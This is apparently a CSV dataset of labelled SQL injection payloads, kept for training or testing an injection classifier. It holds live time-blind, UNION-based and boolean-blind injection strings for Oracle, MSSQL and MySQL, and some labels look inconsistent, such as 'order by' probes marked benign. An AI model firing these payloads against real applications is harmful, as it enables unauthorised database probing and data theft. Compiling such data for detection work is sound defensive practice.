id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
25059,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25063,"1 ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 6010 = 6010",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
25034,1' ) ) as azsd where 3870 = 3870 waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25064,"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""ckht"" = ""ckht",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25100,"1"" ) where 7588 = 7588 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25135,"1"" waitfor delay '0:0:5' and ""syhx"" = ""syhx",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25144,waitfor delay '0:0:5' ) ||',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25155,1 ) waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
25163,"1"" ) ) order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
25172,"iif ( 7036 = 2370,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
25178,"-7395%"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 20 chars.,2
25189,"-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,2
25000,"1' where 7445 = 7445 union all select null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
25001,"-4091"" ) ) ) union all select 6694,6694--",union_based,generic,0.7,UNION-based payload detected. Payload length: 41 chars.,2
25004,"-6405' union all select 8235,8235,8235,8235,8235#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
25008,"-8454"" or 6872 = 6872",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
25011,-8378%' ) union all select 5491#,union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
25012,"-5193 where 2175 = 2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",union_based,generic,0.7,UNION-based payload detected. Payload length: 91 chars.,2
25014,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
25019,"1"" ) where 8702 = 8702 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
25020,-8515' or 1329 = 9536,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
25021,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
25025,1 ) where 9446 = 9446 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 44 chars.,2
25028,"1 ) ) ) union all select null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
25029,"1 ) where 7775 = 7775 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 60 chars.,2
25032,"1"" ) ) and 6486 = 3843 and ( ( ""fbka"" like ""fbka",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
25042,"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
25046,1 ) where 1013 = 1013 and 5573 = 9445#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 38 chars.,2
25047,1'|| ( select 'owzs' where 1475 = 1475 union all select null--,union_based,generic,0.7,UNION-based payload detected. Payload length: 62 chars.,2
25051,"-9856"" union all select 9753--",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
25052,"-4329' ) union all select 1353,1353,1353,1353,1353,1353#",union_based,generic,0.7,UNION-based payload detected. Payload length: 56 chars.,2
25053,"1"" union all select null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 30 chars.,2
25055,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
25058,"-3031"" union all select 2681#",union_based,generic,0.7,UNION-based payload detected. Payload length: 29 chars.,2
25062,1' ) ) and 7533 = 7533 and ( ( 'ialm' = 'ialm,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 45 chars.,2
25069,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
25075,-5615' ) where 5931 = 5931 or 8450 = 9229,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 41 chars.,2
25076,"-5143'+ ( select 'zyrr' where 8405 = 8405 union all select 8405,8405,8405,8405#",union_based,generic,0.7,UNION-based payload detected. Payload length: 79 chars.,2
25078,"-8200' in boolean mode ) union all select 3360,3360--",union_based,generic,0.7,UNION-based payload detected. Payload length: 53 chars.,2
25082,"-3767' ) as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",union_based,generic,0.7,UNION-based payload detected. Payload length: 87 chars.,2
25083,-1127 or 7391 = 4954,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 20 chars.,2
25088,"-4317"" ) ) as nxvn where 2566 = 2566 union all select 2566,2566,2566#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
25089,-9434' ) union all select 3106#,union_based,generic,0.7,UNION-based payload detected. Payload length: 31 chars.,2
25091,"1%' ) ) union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 75 chars.,2
25096,"1%"" union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
25097,1 where 3027 = 3027 and 4595 = 4595#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 36 chars.,2
25102,"-4127%' union all select 9558,9558,9558#",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
25104,-4208%' ) ) ) or 1133 = 9010--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 30 chars.,2
25108,1' ) ) ) and 2006 = 2006,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
25109,-9100 ) or 8792 = 9550--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
25115,"1' ) ) ) union all select null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
25119,"-4679 where 9634 = 9634 union all select 9634,9634,9634,9634,9634,9634,9634--",union_based,generic,0.7,UNION-based payload detected. Payload length: 77 chars.,2
25126,"1%"" ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
25127,"-6548%"" ) union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",union_based,generic,0.7,UNION-based payload detected. Payload length: 73 chars.,2
25133,"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
25136,"-8667'+ ( select ymmg where 6132 = 6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132#",union_based,generic,0.7,UNION-based payload detected. Payload length: 97 chars.,2
25138,-2223' ) ) as mjwp where 8650 = 8650 or 7900 = 5838,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
25145,"-9569%' ) ) union all select 8405,8405,8405,8405--",union_based,generic,0.7,UNION-based payload detected. Payload length: 50 chars.,2
25146,"-5755"" or 3581 = 7566",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
25148,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",union_based,generic,0.7,UNION-based payload detected. Payload length: 76 chars.,2
25151,"1' ) where 2802 = 2802 union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 55 chars.,2
25152,1 ) ) as myxo where 1759 = 1759 union all select null#,union_based,generic,0.7,UNION-based payload detected. Payload length: 54 chars.,2
25159,"-7234"" ) union all select 3154,3154,3154,3154#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
25161,"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
25162,-8521'+ ( select ucim where 9003 = 9003 union all select 9003--,union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
25165,"-2500' ) ) ) union all select 6853,6853,6853,6853--",union_based,generic,0.7,UNION-based payload detected. Payload length: 51 chars.,2
25170,-2817%' ) or 8255 = 3841--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
25171,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
25174,"-6457 where 1764 = 1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",union_based,generic,0.7,UNION-based payload detected. Payload length: 82 chars.,2
25175,"-5054%"" ) ) ) union all select 8263,8263,8263,8263--",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
25179,"1"" where 9241 = 9241 union all select null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
25181,"1'+ ( select 'sacd' where 5984 = 5984 union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
25184,"-8258"" ) ) as swjp where 2681 = 2681 union all select 2681,2681,2681,2681,2681,2681--",union_based,generic,0.7,UNION-based payload detected. Payload length: 85 chars.,2
25185,-4518 where 8023 = 8023 or 6872 = 6872--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 40 chars.,2
25187,"-8355%"" ) ) ) union all select 3004,3004,3004,3004,3004,3004,3004--",union_based,generic,0.7,UNION-based payload detected. Payload length: 67 chars.,2
25036,"1"""" ( .'. ( , ( .",benign,generic,0.5,. Payload length: 17 chars.,2
25017,"1"" rlike sleep ( 5 ) and ""rylv"" like ""rylv",time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
25023,"1%"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25024,"1 ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2952 = 2952",boolean_blind,generic,1.0,"Signals: 'substring', 'substr', 'char'; Boolean-blind SQLi (OR/AND logic)",1
25030,1' ) ) rlike sleep ( 5 ) and ( ( 'tufg' = 'tufg,time_blind,mysql,1.0,"Signals: 'sleep', 'rlike'; Time-blind SQLi (sleep/delay function); DB: mysql",1
